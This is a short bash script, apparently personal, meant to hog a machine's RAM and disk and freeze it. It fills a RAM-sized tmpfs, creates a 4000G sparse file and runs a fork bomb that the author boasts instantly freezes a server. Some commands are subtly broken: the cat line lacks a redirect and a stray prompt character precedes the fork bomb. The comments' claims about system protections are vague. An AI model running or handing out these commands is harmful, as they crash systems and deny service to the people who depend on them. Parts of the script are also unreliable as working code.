#!/bin/bash
#
# Script to hog system resources
# Resources used here are RAM and Disks
#

#
# Eating up Memory
#
# Identify the mem size in kb
MEM_SIZE=`grep MemTotal /proc/meminfo | awk '{print $2}'`

# Create tempfs folder in User Home
TMP_MOUNT=/home/vikrams/ramdisk
mkdir -p $TMP_MOUNT

# Mount the temp filesystem and fill it
mount -t tmpfs -o size=${MEM_SIZE}K tempfs $TMP_MOUNT
cat /dev/zero $TMP_MOUNT/bigfile

#
# Eating up Disk space
#
# Filling /tmp will bring the system to a grinding halt
#
dd of=largefile bs=1 count=0 seek=4000G

# I have tried and tested this command successfully as non-root
# Self replicating bot, just instantly freezes the server :)
$ func_foo(){ func_foo|func_foo & };func_foo

# We can split this script into smaller chunks
# the other commands towards the end may not run if the system is already slow
# Most of Linux systems are protected from running out of resources by non-root users
# Ubuntu 18.04 and higher are inbuilt to such hogging by non-root users
# This may be possible on Windows or non-Linux
# To some extent we can slow/hang the system with the above commands
